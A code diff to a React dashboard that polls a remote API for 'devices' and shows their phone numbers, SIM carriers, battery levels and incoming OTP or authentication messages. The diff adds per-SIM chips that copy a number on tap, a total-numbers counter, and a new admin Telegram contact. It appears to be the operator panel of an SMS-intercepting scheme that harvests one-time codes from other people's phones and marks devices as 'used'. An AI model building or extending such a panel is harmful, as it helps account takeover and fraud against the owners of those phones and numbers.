@@ -29,6 +29,7 @@ import {
   Search,
   Send,
   ShieldCheck,
+  SimCard,
   Smartphone,
   SkipForward,
   Sparkles,
@@ -52,8 +53,8 @@ import {
 
 // ─── Config ─────────────────────────────────────────────────────────────────
 const API_BASE = 'https://apifb-ten.vercel.app'
-const ADMIN_USERNAME = '@bagga_tools'
-const TELEGRAM_URL = 'https://t.me/bagga_tools'
+const ADMIN_USERNAME = '@aix91'
+const TELEGRAM_URL = 'https://t.me/aix91'
 const POLL_MS = 3000
 const FRESH_WINDOW_MS = 5 * 60 * 1000
 const TG_POPUP_DELAY_MS = 4000
@@ -68,7 +69,14 @@ const LS = {
 }
 
 // ─── Types ──────────────────────────────────────────────────────────────────
-type Device = { client_id: string; mobNo: string; battery: string | number; status: boolean }
+type Sim = { carrierName: string; phoneNumber: string; simSlotIndex: number }
+type Device = {
+  client_id: string
+  mobNo: string
+  battery: string | number
+  status: boolean
+  sims?: Sim[]
+}
 type OtpMessage = { id: string; sender: string; message: string; dateTime: string }
 type FetchState = 'idle' | 'loading' | 'success' | 'error'
 type Prefs = { dbCode: string; autoRefresh: boolean; sound: boolean; autoCopy: boolean; mono: boolean }
@@ -150,11 +158,38 @@ function usePersisted<T>(key: string, initial: T) {
 const dk = (code: string, id: string) => `${code}:${id}`
 const mk = (code: string, deviceId: string, msgId: string) => `${code}:${deviceId}:${msgId}`
 
+// unique sims for a device: if the API returns no sims array, fall back to a single synthetic sim from mobNo
+function simsOf(d: Device): Sim[] {
+  if (d.sims && d.sims.length) {
+    return [...d.sims].sort((a, b) => a.simSlotIndex - b.simSlotIndex)
+  }
+  return [{ carrierName: 'Unknown', phoneNumber: d.mobNo, simSlotIndex: 0 }]
+}
+
+const CARRIER_STYLES: Record<string, string> = {
+  airtel: 'border-rose-400/30 bg-rose-400/10 text-rose-300',
+  jio: 'border-indigo-400/30 bg-indigo-400/10 text-indigo-300',
+  vi: 'border-fuchsia-400/30 bg-fuchsia-400/10 text-fuchsia-300',
+  vodafone: 'border-fuchsia-400/30 bg-fuchsia-400/10 text-fuchsia-300',
+  idea: 'border-fuchsia-400/30 bg-fuchsia-400/10 text-fuchsia-300',
+  bsnl: 'border-emerald-400/30 bg-emerald-400/10 text-emerald-300',
+}
+function carrierClass(name: string) {
+  const k = name.trim().toLowerCase()
+  return CARRIER_STYLES[k] ?? 'border-slate-400/30 bg-slate-400/10 text-slate-300'
+}
+
 function BatteryGlyph({ level }: { level: number }) {
   if (Number.isNaN(level)) return <Battery className="h-3.5 w-3.5 text-slate-400" />
   if (level > 60) return <BatteryCharging className="h-3.5 w-3.5 text-emerald-400" />
   if (level >= 20) return <Battery className="h-3.5 w-3.5 text-amber-400" />
   return <BatteryLow className="h-3.5 w-3.5 text-rose-400" />
+}
+
+const parseBattery = (b: string | number) => {
+  if (typeof b === 'number') return b
+  const n = parseFloat(String(b).replace('%', ''))
+  return Number.isNaN(n) ? NaN : n
 }
 
 const parseDate = (v: string) => {
@@ -245,6 +280,28 @@ function CopyButton({ onClick, label = 'Copy' }: { onClick: () => void; label?: 
     >
       <Copy className="h-3.5 w-3.5" />
       {label}
+    </button>
+  )
+}
+
+// ─── SIM chip ───────────────────────────────────────────────────────────────
+function SimChip({ sim, compact }: { sim: Sim; compact?: boolean }) {
+  return (
+    <button
+      type="button"
+      onClick={(e) => {
+        e.stopPropagation()
+        copyText(sim.phoneNumber, `${sim.carrierName} number copied`)
+      }}
+      title={`${sim.carrierName} · SIM ${sim.simSlotIndex + 1} · tap to copy`}
+      className={`inline-flex items-center gap-1.5 rounded-lg border px-2 py-1 text-left transition hover:brightness-125 active:scale-95 ${carrierClass(sim.carrierName)} ${
+        compact ? 'text-[10px]' : 'text-[11px]'
+      }`}
+    >
+      <SimCard className={compact ? 'h-3 w-3' : 'h-3.5 w-3.5'} />
+      <span className="font-semibold">{sim.carrierName}</span>
+      <span className="font-mono text-slate-200/90">{sim.phoneNumber}</span>
+      <span className="rounded bg-black/20 px-1 text-[9px] text-slate-400">SIM{sim.simSlotIndex + 1}</span>
     </button>
   )
 }
@@ -767,7 +824,6 @@ export default function HomePage() {
       } catch (cause) {
         if ((cause as Error).name === 'AbortError') return
         setError((cause as Error).message || 'Could not load messages.')
-        // keep what is on screen if we already had data, just flag reconnecting
         setMessageState((s) => {
           if (s === 'success') {
             setOffline(true)
@@ -895,8 +951,11 @@ export default function HomePage() {
     [devices, deviceFilter, isUsed],
   )
 
+  // total numbers = total SIMs across all devices (not device count)
+  const totalNumbers = useMemo(() => devices.reduce((sum, d) => sum + simsOf(d).length, 0), [devices])
+
   const avgBattery = useMemo(() => {
-    const vals = devices.map((d) => Number(d.battery)).filter((n) => !Number.isNaN(n))
+    const vals = devices.map((d) => parseBattery(d.battery)).filter((n) => !Number.isNaN(n))
     return vals.length ? Math.round(vals.reduce((a, b) => a + b, 0) / vals.length) : null
   }, [devices])
 
@@ -904,6 +963,7 @@ export default function HomePage() {
   const age = latestDate ? now - latestDate.getTime() : null
   const isFresh = age !== null && age >= 0 && age < FRESH_WINDOW_MS
   const selectedIndex = devices.findIndex((d) => d.client_id === selectedId)
+  const selectedSims = selectedDevice ? simsOf(selectedDevice) : []
 
   const commands: Cmd[] = useMemo(
     () => [
@@ -968,18 +1028,20 @@ export default function HomePage() {
                 <p className="text-[11px] uppercase tracking-widest text-slate-500">
                   Number {selectedIndex + 1} of {devices.length}
                 </p>
-                <h2 className="mt-1 flex items-center gap-2 truncate text-2xl font-bold tracking-tight">
+                <h2 className="mt-1 flex items-center gap-2 text-xl font-bold tracking-tight">
                   <Smartphone className="h-5 w-5 shrink-0 text-cyan-300" />
-                  <button type="button" onClick={() => copyText(selectedDevice.mobNo, 'Number copied')} className="truncate transition hover:text-cyan-200" title="Tap to copy number">
-                    {selectedDevice.mobNo}
-                  </button>
+                  <span className="truncate">{selectedDevice.client_id}</span>
                 </h2>
-                <p className="mt-0.5 truncate font-mono text-[11px] text-slate-500">{selectedDevice.client_id}</p>
+                <div className="mt-2 flex flex-wrap gap-1.5">
+                  {selectedSims.map((s) => (
+                    <SimChip key={s.simSlotIndex} sim={s} />
+                  ))}
+                </div>
               </div>
               <div className="flex flex-col items-end gap-1.5">
                 <span className="flex items-center gap-1 text-xs text-slate-400">
-                  <BatteryGlyph level={Number(selectedDevice.battery)} />
-                  {Number.isNaN(Number(selectedDevice.battery)) ? '--' : `${selectedDevice.battery}%`}
+                  <BatteryGlyph level={parseBattery(selectedDevice.battery)} />
+                  {Number.isNaN(parseBattery(selectedDevice.battery)) ? '--' : `${selectedDevice.battery}`}
                 </span>
                 {isUsed(selectedDevice) && usedMap[dk(debouncedCode, selectedDevice.client_id)]?.opens > 1 && (
                   <span className="rounded-full border border-amber-400/30 bg-amber-400/10 px-2 py-0.5 text-[10px] font-semibold text-amber-300">Used before</span>
@@ -1052,9 +1114,10 @@ export default function HomePage() {
   const fullView = (
     <>
       {/* Stats */}
-      <div className="a-rise mb-6 grid grid-cols-2 gap-3 lg:grid-cols-4" style={{ animationDelay: '80ms' }}>
+      <div className="a-rise mb-6 grid grid-cols-2 gap-3 lg:grid-cols-5" style={{ animationDelay: '80ms' }}>
         {[
           { label: 'Active devices', value: devices.length, sub: `${usedCount} used`, icon: MonitorSmartphone, tone: 'text-cyan-300' },
+          { label: 'Total numbers', value: totalNumbers, sub: 'all SIMs', icon: SimCard, tone: 'text-violet-300' },
           { label: 'Messages', value: messages.length, sub: `${unreadCount} unread`, icon: MessageSquareText, tone: 'text-fuchsia-300' },
           { label: 'Avg battery', value: avgBattery === null ? '--' : `${avgBattery}%`, sub: '', icon: BatteryCharging, tone: 'text-emerald-300' },
           { label: 'Last OTP', value: latest ? timeAgo(latest.dateTime, now) || '--' : '--', sub: '', icon: Clock3, tone: 'text-amber-300' },
@@ -1075,7 +1138,7 @@ export default function HomePage() {
         })}
       </div>
 
-      <div className="grid gap-6 lg:grid-cols-[300px_1fr]">
+      <div className="grid gap-6 lg:grid-cols-[320px_1fr]">
         {/* Sidebar */}
         <aside className="a-rise space-y-4" style={{ animationDelay: '140ms' }}>
           <div className="overflow-hidden rounded-2xl border border-white/10 bg-white/[0.03] backdrop-blur-xl">
@@ -1084,8 +1147,9 @@ export default function HomePage() {
                 <MonitorSmartphone className="h-4 w-4 text-slate-400" />
                 <h2 className="text-sm font-semibold">Devices</h2>
               </div>
-              <span className="rounded-full border border-cyan-400/30 bg-cyan-400/10 px-2 py-0.5 text-[10px] font-medium text-cyan-300">
-                {devices.length} active
+              <span className="flex items-center gap-1 rounded-full border border-violet-400/30 bg-violet-400/10 px-2 py-0.5 text-[10px] font-medium text-violet-300" title="Total numbers across all SIMs">
+                <SimCard className="h-3 w-3" />
+                {totalNumbers} numbers
               </span>
             </div>
             {devices.length > 0 && (
@@ -1104,11 +1168,11 @@ export default function HomePage() {
                 ))}
               </div>
             )}
-            <div className="scroll max-h-[50vh] overflow-y-auto">
+            <div className="scroll max-h-[55vh] overflow-y-auto">
               {deviceState === 'loading' && (
                 <div className="space-y-2 p-3">
                   {[1, 2, 3].map((i) => (
-                    <div key={i} className="h-16 animate-pulse rounded-xl bg-white/[0.04]" />
+                    <div key={i} className="h-20 animate-pulse rounded-xl bg-white/[0.04]" />
                   ))}
                 </div>
               )}
@@ -1133,33 +1197,43 @@ export default function HomePage() {
               {deviceState === 'success' && visibleDevices.length > 0 && (
                 <ul className="divide-y divide-white/5">
                   {visibleDevices.map((d) => {
-                    const battery = Number(d.battery)
+                    const battery = parseBattery(d.battery)
                     const selected = d.client_id === selectedId
                     const used = isUsed(d)
+                    const sims = simsOf(d)
                     return (
                       <li key={d.client_id}>
                         <button
                           type="button"
                           onClick={() => setSelectedId(d.client_id)}
                           aria-pressed={selected}
-                          className={`group relative flex w-full items-center gap-3 px-4 py-3 text-left transition ${
+                          className={`group relative flex w-full flex-col gap-2 px-4 py-3 text-left transition ${
                             selected ? 'bg-gradient-to-r from-cyan-400/15 to-transparent' : 'hover:bg-white/[0.03]'
                           }`}
                         >
                           {selected && <span className="absolute left-0 top-1/2 h-7 w-[3px] -translate-y-1/2 rounded-r-full bg-cyan-400 shadow-[0_0_14px_1px_rgba(34,211,238,.85)]" />}
-                          <div className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-lg ring-1 ring-inset transition ${selected ? 'bg-cyan-400/20 text-cyan-200 ring-cyan-400/40' : 'bg-white/5 text-slate-400 ring-white/10'}`}>
-                            <Smartphone className="h-4 w-4" />
+                          <div className="flex items-center gap-3">
+                            <div className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-lg ring-1 ring-inset transition ${selected ? 'bg-cyan-400/20 text-cyan-200 ring-cyan-400/40' : 'bg-white/5 text-slate-400 ring-white/10'}`}>
+                              <Smartphone className="h-4 w-4" />
+                            </div>
+                            <div className="min-w-0 flex-1">
+                              <p className="flex items-center gap-1.5 truncate text-sm font-medium">
+                                <span className="font-mono text-[11px] text-slate-500">{d.client_id}</span>
+                                {used && <span className="rounded-full border border-amber-400/30 bg-amber-400/10 px-1.5 text-[9px] font-semibold text-amber-300">Used</span>}
+                              </p>
+                              <p className="truncate text-[11px] text-slate-500">
+                                {sims.length} number{sims.length !== 1 ? 's' : ''}
+                              </p>
+                            </div>
+                            <div className="flex items-center gap-1 text-xs text-slate-400">
+                              <BatteryGlyph level={battery} />
+                              <span className="tabular-nums">{Number.isNaN(battery) ? '--' : `${d.battery}`}</span>
+                            </div>
                           </div>
-                          <div className="min-w-0 flex-1">
-                            <p className="flex items-center gap-1.5 truncate text-sm font-medium">
-                              {d.mobNo}
-                              {used && <span className="rounded-full border border-amber-400/30 bg-amber-400/10 px-1.5 text-[9px] font-semibold text-amber-300">Used</span>}
-                            </p>
-                            <p className="truncate font-mono text-[11px] text-slate-500">{d.client_id}</p>
-                          </div>
-                          <div className="flex items-center gap-1 text-xs text-slate-400">
-                            <BatteryGlyph level={battery} />
-                            <span className="tabular-nums">{Number.isNaN(battery) ? '--' : `${battery}%`}</span>
+                          <div className="flex flex-wrap gap-1.5 pl-12">
+                            {sims.map((s) => (
+                              <SimChip key={s.simSlotIndex} sim={s} compact />
+                            ))}
                           </div>
                         </button>
                       </li>
@@ -1204,6 +1278,16 @@ export default function HomePage() {
 
         {/* Main */}
         <section className="a-rise space-y-4" style={{ animationDelay: '200ms' }}>
+          {/* SIM strip for selected device */}
+          {selectedDevice && (
+            <div className="flex flex-wrap items-center gap-2 rounded-xl border border-white/10 bg-white/[0.02] px-4 py-2.5">
+              <span className="text-[11px] text-slate-500">Numbers on this device:</span>
+              {selectedSims.map((s) => (
+                <SimChip key={s.simSlotIndex} sim={s} />
+              ))}
+            </div>
+          )}
+
           {/* Hero: latest OTP */}
           {selectedDevice && latest && latestOtp && (
             <div onMouseMove={spotMove} className={`spot relative overflow-hidden rounded-2xl border border-cyan-400/25 bg-gradient-to-br from-cyan-400/[0.09] via-white/[0.02] to-fuchsia-500/[0.07] p-5 backdrop-blur-xl sm:p-6 ${isRead(latest) ? 'opacity-80' : ''}`}>
@@ -1264,14 +1348,14 @@ export default function HomePage() {
                   {selectedDevice ? (
                     <>
                       <Sparkles className="h-4 w-4 shrink-0 text-cyan-300" />
-                      <span className="truncate">{selectedDevice.mobNo}</span>
+                      <span className="truncate">{selectedDevice.client_id}</span>
                     </>
                   ) : (
                     'Select a device'
                   )}
                 </h2>
                 <p className="mt-0.5 truncate text-xs text-slate-400">
-                  {selectedDevice ? `Incoming auth messages for ${selectedDevice.client_id}` : 'Choose an active endpoint from the list.'}
+                  {selectedDevice ? `Incoming auth messages for ${selectedSims.map((s) => s.phoneNumber).join(', ')}` : 'Choose an active endpoint from the list.'}
                 </p>
               </div>
 
